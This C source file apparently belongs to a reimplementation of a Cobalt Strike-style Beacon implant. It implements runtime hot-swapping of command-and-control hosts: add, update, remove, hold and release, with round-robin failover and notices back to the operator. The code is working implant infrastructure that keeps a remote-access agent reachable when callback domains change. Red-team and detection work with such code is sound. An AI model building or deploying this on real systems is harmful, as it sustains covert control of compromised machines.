/* ---------------------------------------------------------------------------
 * 4.10 beacon_config host hot-swap (tier-3 item 10)
 *
 * Official contract (4.10 "Through the BeaconGate" + 4.12 manual
 * "Beacon Runtime Configuration"):
 *   beacon_config host info                                     - list hosts
 *   beacon_config host add [h1,h2] [uri1,uri2]                  - <=32 hosts
 *   beacon_config host update [from...] [to...] [touri...]      - swap hosts
 *   beacon_config host remove [h1,h2,...]                       - drop hosts
 *   beacon_config host profiles                                 - pre-baked
 *                                                                Host Profiles
 *   beacon_config host hold [h1,...] / release [h1,...]         - rotation
 *        only; when every host is held they all auto-release
 *   beacon_config host reset [all|status|statistics] [host]     - clear state
 *   beacon_config failover_notification [true|false]            - notify when
 *        a connection is re-established after failures
 *
 * Design: the baked SETTING_DOMAINS blob lives in the guarded settings
 * image and must not be mutated, and strategy.cpp keeps one-shot static
 * parse state per process. This module is therefore an overlay: once
 * seeded it owns the host/uri list the main loop picks from (round-robin
 * skipping held hosts); until the first verb the baked strategy path
 * keeps serving. Both paths end in the same per-cycle http_init(), so a
 * host swap takes effect on the very next check-in with no connection
 * surgery.
 *
 * Task wire (COMMAND_HOST_CONFIG, little-endian datap):
 *   int verb; then per verb (z = length-prefixed ASCIIZ string):
 *     1 add     z hosts, z uris          (comma-separated lists)
 *     2 update  z from, z to, z tours    (tours may be empty)
 *     3 remove  z hosts
 *     4 hold    z hosts
 *     5 release z hosts
 *     7 reset   z scope, z host          (host may be empty)
 *     9 failover_notification_set: int onoff (after the verb)
 *     0 info / 6 profiles / 8 failover_notification_get: no operands
 * Replies are CALLBACK_OUTPUT text.
 * ------------------------------------------------------------------------- */
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "parse.h"
#include "beacon.h"
#include "commands.h"
#include "hostprof.h"
#include "hostcfg.h"

#define HC_MAX_HOSTS   32   /* official cap */
#define HC_HOST_LEN    128
#define HC_URI_LEN     256

typedef struct {
	char         host[HC_HOST_LEN];
	char         uri[HC_URI_LEN];
	BOOL         held;
	unsigned int checks;
	unsigned int fails;
} hc_entry;

static hc_entry hc_tab[HC_MAX_HOSTS];
static int      hc_n       = 0;
static int      hc_cursor  = -1;
static BOOL     hc_failov_notify = FALSE;
static BOOL     hc_last_failed   = FALSE;
static char     hc_last_host[HC_HOST_LEN] = "";

/* comma-token walk over a caller-owned scratch copy */
typedef void (*hc_token_cb)(const char * token, void * ctx);
static int hc_split(char * scratch, int smax, hc_token_cb cb, void * ctx) {
	int n = 0;
	char * tok;
	if (scratch == NULL)
		return 0;
	scratch[smax - 1] = '\0';
	tok = strtok(scratch, ",");
	while (tok != NULL) {
		while (*tok == ' ')
			tok++;
		if (*tok != '\0') {
			cb(tok, ctx);
			n++;
		}
		tok = strtok(NULL, ",");
	}
	return n;
}

typedef struct {
	char hosts[HC_MAX_HOSTS][HC_HOST_LEN];
	char uris[HC_MAX_HOSTS][HC_URI_LEN];
	int  n;
} hc_list;

static void hc_collect(const char * token, void * ctx) {
	hc_list * l = (hc_list *)ctx;
	if (l->n >= HC_MAX_HOSTS)
		return;
	strncpy(l->hosts[l->n], token, HC_HOST_LEN - 1);
	l->hosts[l->n][HC_HOST_LEN - 1] = '\0';
	l->n++;
}

static void hc_collect_uri(const char * token, void * ctx) {
	hc_list * l = (hc_list *)ctx;
	/* uris land at the index of the NEXT host slot (host i <-> uri i) */
	int idx = l->n;
	if (idx >= HC_MAX_HOSTS)
		return;
	strncpy(l->uris[idx], token, HC_URI_LEN - 1);
	l->uris[idx][HC_URI_LEN - 1] = '\0';
}

void hostcfg_init(const char * domains) {
	static char scratch[2048];
	char * tok;
	int idx = -1;

	hc_n = 0;
	hc_cursor = -1;
	hc_last_failed = FALSE;
	hc_last_host[0] = '\0';
	if (domains == NULL)
		return;

	strncpy(scratch, domains, sizeof(scratch) - 1);
	scratch[sizeof(scratch) - 1] = '\0';

	/* baked format is "host,/uri,host,/uri..." - identical pairs to the
	 * strategy.cpp tokenization */
	tok = strtok(scratch, ",");
	while (tok != NULL && hc_n < HC_MAX_HOSTS) {
		while (*tok == ' ')
			tok++;
		if (tok[0] == '/') {
			if (idx >= 0) {
				strncpy(hc_tab[idx].uri, tok, HC_URI_LEN - 1);
				hc_tab[idx].uri[HC_URI_LEN - 1] = '\0';
			}
		}
		else if (tok[0] != '\0') {
			idx = hc_n;
			memset(&hc_tab[hc_n], 0, sizeof(hc_entry));
			strncpy(hc_tab[hc_n].host, tok, HC_HOST_LEN - 1);
			hc_n++;
		}
		tok = strtok(NULL, ",");
	}
}

BOOL hostcfg_active(void) {
	return hc_n > 0;
}

/* pick the next host for this cycle: round-robin skipping held entries.
 * When every host is held, release them all first (official semantics).
 * Returns FALSE when the overlay is empty (caller falls back to the baked
 * strategy path). */
BOOL hostcfg_pick(char * host, int hmax, char * uri, int umax) {
	int scans;
	if (hc_n == 0)
		return FALSE;

	{
		int i, held = 0;
		for (i = 0; i < hc_n; i++)
			held += hc_tab[i].held ? 1 : 0;
		if (held == hc_n && hc_n > 0) {
			for (i = 0; i < hc_n; i++)
				hc_tab[i].held = FALSE;
		}
	}

	for (scans = 0; scans < hc_n; scans++) {
		hc_cursor = (hc_cursor + 1) % hc_n;
		if (!hc_tab[hc_cursor].held)
			break;
	}

	strncpy(host, hc_tab[hc_cursor].host, hmax - 1);
	host[hmax - 1] = '\0';
	if (uri != NULL && umax > 0) {
		strncpy(uri, hc_tab[hc_cursor].uri, umax - 1);
		uri[umax - 1] = '\0';
	}
	strncpy(hc_last_host, hc_tab[hc_cursor].host, HC_HOST_LEN - 1);
	hc_last_host[HC_HOST_LEN - 1] = '\0';
	hc_tab[hc_cursor].checks++;
	return TRUE;
}

/* per-cycle health report from the main loop; drives failover stats and
 * the failover_notification message (re-established after failure) */
void hostcfg_note(const char * host, BOOL ok) {
	int i;
	extern void command_shell_callback(char * buffer, int length, int type);

	if (host == NULL || host[0] == '\0')
		host = hc_last_host;
	for (i = 0; i < hc_n; i++) {
		if (_stricmp(hc_tab[i].host, host) == 0) {
			if (!ok)
				hc_tab[i].fails++;
			break;
		}
	}
	if (hc_failov_notify && hc_last_failed && ok) {
		char msg[320];
		_snprintf(msg, sizeof(msg) - 1,
			"[+] beacon_config: connection re-established via host %s\n", host);
		command_shell_callback(msg, (int)strlen(msg), CALLBACK_OUTPUT);
	}
	hc_last_failed = !ok;
}

static hc_entry * hc_find(const char * host) {
	int i;
	for (i = 0; i < hc_n; i++) {
		if (_stricmp(hc_tab[i].host, host) == 0)
			return &hc_tab[i];
	}
	return NULL;
}

/* pull a length-prefixed ASCIIZ operand into a local buffer; NULL when the
 * task body is exhausted */
static char * hc_arg(datap * parser, char * buf, int max) {
	char * p = data_string_asciiz(parser);
	if (p == NULL)
		return NULL;
	strncpy(buf, p, max - 1);
	buf[max - 1] = '\0';
	return buf;
}

void command_host_config(char * buffer, int length, void (*callback)(char * buffer, int length, int type)) {
	datap parser;
	int verb;
	static char s1[1024], s2[1024], s3[1024];
	static char scratch[1024];
	char msg[256];

	/* first verb seeds the overlay from the baked host list so `info`
	 * starts from the payload's configured hosts */
	if (hc_n == 0)
		hostcfg_init(setting_ptr(SETTING_DOMAINS));

	data_init(&parser, buffer, length);
	verb = (int)data_int(&parser);

	switch (verb) {
	case 0: { /* info */
		char line[512];
		int i;
		callback("beacon_config host info:\n", 26, CALLBACK_OUTPUT);
		for (i = 0; i < hc_n; i++) {
			_snprintf(line, sizeof(line) - 1,
				"  %-40s uri %-28s %s checks=%u fails=%u\n",
				hc_tab[i].host,
				hc_tab[i].uri[0] ? hc_tab[i].uri : "(profile default)",
				hc_tab[i].held ? "HELD" : "ok  ",
				hc_tab[i].checks, hc_tab[i].fails);
			callback(line, (int)strlen(line), CALLBACK_OUTPUT);
		}
		_snprintf(line, sizeof(line) - 1, "  hosts=%d/%d failover_notification=%s\n",
			hc_n, HC_MAX_HOSTS, hc_failov_notify ? "true" : "false");
		callback(line, (int)strlen(line), CALLBACK_OUTPUT);
		return;
	}
	case 6: { /* profiles: pre-baked Host Profiles, read-only by contract */
		char line[512];
		int i;
		int n = hostprof_count();
		callback("beacon_config host profiles (pre-configured, read-only):\n", 59, CALLBACK_OUTPUT);
		for (i = 0; i < n; i++) {
			const char * h  = hostprof_host_at(i);
			const char * gu = hostprof_get_uri_at(i);
			const char * pu = hostprof_post_uri_at(i);
			_snprintf(line, sizeof(line) - 1, "  %-40s get %-24s post %s\n",
				h ? h : "?", gu ? gu : "-", pu ? pu : "-");
			callback(line, (int)strlen(line), CALLBACK_OUTPUT);
		}
		if (n == 0)
			callback("  (no Host Profiles baked into this payload)\n", 48, CALLBACK_OUTPUT);
		return;
	}
	case 8: /* failover_notification get */
		_snprintf(msg, sizeof(msg) - 1, "failover_notification: %s\n", hc_failov_notify ? "true" : "false");
		callback(msg, (int)strlen(msg), CALLBACK_OUTPUT);
		return;
	case 9: { /* failover_notification set */
		int onoff = (int)data_int(&parser);
		hc_failov_notify = onoff ? TRUE : FALSE;
		_snprintf(msg, sizeof(msg) - 1, "failover_notification set to %s\n", hc_failov_notify ? "true" : "false");
		callback(msg, (int)strlen(msg), CALLBACK_OUTPUT);
		return;
	}
	default:
		break;
	}

	if (hc_arg(&parser, s1, sizeof(s1)) == NULL) {
		callback("[-] beacon_config: missing operand\n", 36, CALLBACK_OUTPUT);
		return;
	}

	switch (verb) {
	case 1: { /* add hosts uris */
		hc_list l;
		int i, added = 0;
		memset(&l, 0, sizeof(l));
		strncpy(scratch, s1, sizeof(scratch) - 1);
		scratch[sizeof(scratch) - 1] = '\0';
		hc_split(scratch, sizeof(scratch), hc_collect, &l);
		if (hc_arg(&parser, s2, sizeof(s2)) != NULL && s2[0] != '\0') {
			hc_list ul;
			memset(&ul, 0, sizeof(ul));
			strncpy(scratch, s2, sizeof(scratch) - 1);
			scratch[sizeof(scratch) - 1] = '\0';
			hc_split(scratch, sizeof(scratch), hc_collect_uri, &ul);
			for (i = 0; i < ul.n && i < HC_MAX_HOSTS; i++)
				strncpy(l.uris[i], ul.uris[i], HC_URI_LEN - 1);
		}
		for (i = 0; i < l.n; i++) {
			if (hc_n >= HC_MAX_HOSTS)
				break;
			if (hc_find(l.hosts[i]) != NULL)
				continue; /* idempotent add */
			memset(&hc_tab[hc_n], 0, sizeof(hc_entry));
			strncpy(hc_tab[hc_n].host, l.hosts[i], HC_HOST_LEN - 1);
			strncpy(hc_tab[hc_n].uri, l.uris[i], HC_URI_LEN - 1);
			hc_n++;
			added++;
		}
		_snprintf(msg, sizeof(msg) - 1, "host add: %d added, %d/%d hosts\n", added, hc_n, HC_MAX_HOSTS);
		callback(msg, (int)strlen(msg), CALLBACK_OUTPUT);
		break;
	}
	case 2: { /* update from to [touri] */
		hc_list from, to, tours;
		int i, moved = 0;
		if (hc_arg(&parser, s2, sizeof(s2)) == NULL) {
			callback("[-] beacon_config: host update needs from and to\n", 47, CALLBACK_OUTPUT);
			return;
		}
		hc_arg(&parser, s3, sizeof(s3)); /* tours optional */
		memset(&from, 0, sizeof(from));
		memset(&to, 0, sizeof(to));
		memset(&tours, 0, sizeof(tours));
		strncpy(scratch, s1, sizeof(scratch) - 1); scratch[sizeof(scratch) - 1] = '\0';
		hc_split(scratch, sizeof(scratch), hc_collect, &from);
		strncpy(scratch, s2, sizeof(scratch) - 1); scratch[sizeof(scratch) - 1] = '\0';
		hc_split(scratch, sizeof(scratch), hc_collect, &to);
		if (s3[0] != '\0') {
			strncpy(scratch, s3, sizeof(scratch) - 1); scratch[sizeof(scratch) - 1] = '\0';
			hc_split(scratch, sizeof(scratch), hc_collect, &tours);
		}
		for (i = 0; i < from.n && i < to.n; i++) {
			hc_entry * e = hc_find(from.hosts[i]);
			if (e == NULL)
				continue;
			strncpy(e->host, to.hosts[i], HC_HOST_LEN - 1);
			e->host[HC_HOST_LEN - 1] = '\0';
			if (i < tours.n && tours.hosts[i][0] != '\0') {
				strncpy(e->uri, tours.hosts[i], HC_URI_LEN - 1);
				e->uri[HC_URI_LEN - 1] = '\0';
			}
			e->held = FALSE;
			moved++;
		}
		_snprintf(msg, sizeof(msg) - 1, "host update: %d host(s) updated\n", moved);
		callback(msg, (int)strlen(msg), CALLBACK_OUTPUT);
		break;
	}
	case 3: { /* remove */
		hc_list l;
		int i, j, removed = 0;
		memset(&l, 0, sizeof(l));
		strncpy(scratch, s1, sizeof(scratch) - 1); scratch[sizeof(scratch) - 1] = '\0';
		hc_split(scratch, sizeof(scratch), hc_collect, &l);
		for (i = 0; i < l.n; i++) {
			for (j = 0; j < hc_n; j++) {
				if (_stricmp(hc_tab[j].host, l.hosts[i]) == 0) {
					memmove(&hc_tab[j], &hc_tab[j + 1], (hc_n - j - 1) * sizeof(hc_entry));
					hc_n--;
					removed++;
					break;
				}
			}
		}
		if (hc_cursor >= hc_n)
			hc_cursor = hc_n > 0 ? hc_n - 1 : -1;
		_snprintf(msg, sizeof(msg) - 1, "host remove: %d removed, %d remain\n", removed, hc_n);
		callback(msg, (int)strlen(msg), CALLBACK_OUTPUT);
		break;
	}
	case 4:   /* hold */
	case 5: { /* release */
		hc_list l;
		int i, hit = 0;
		memset(&l, 0, sizeof(l));
		strncpy(scratch, s1, sizeof(scratch) - 1); scratch[sizeof(scratch) - 1] = '\0';
		hc_split(scratch, sizeof(scratch), hc_collect, &l);
		for (i = 0; i < l.n; i++) {
			hc_entry * e = hc_find(l.hosts[i]);
			if (e != NULL) {
				e->held = (verb == 4) ? TRUE : FALSE;
				hit++;
			}
		}
		_snprintf(msg, sizeof(msg) - 1, "host %s: %d host(s)\n", verb == 4 ? "hold" : "release", hit);
		callback(msg, (int)strlen(msg), CALLBACK_OUTPUT);
		break;
	}
	case 7: { /* reset [all|status|statistics] [host] */
		int i;
		int scope_status = 1, scope_stats = 1; /* all = both */
		hc_arg(&parser, s2, sizeof(s2)); /* optional host */
		if (strcmp(s1, "status") == 0)
			scope_stats = 0;
		else if (strcmp(s1, "statistics") == 0)
			scope_status = 0;
		for (i = 0; i < hc_n; i++) {
			if (s2[0] != '\0' && _stricmp(hc_tab[i].host, s2) != 0)
				continue;
			if (scope_status)
				hc_tab[i].held = FALSE;
			if (scope_stats) {
				hc_tab[i].checks = 0;
				hc_tab[i].fails = 0;
			}
		}
		hc_last_failed = FALSE;
		callback("host reset done\n", 16, CALLBACK_OUTPUT);
		break;
	}
	default:
		callback("[-] beacon_config: unknown verb\n", 33, CALLBACK_OUTPUT);
		return;
	}
}
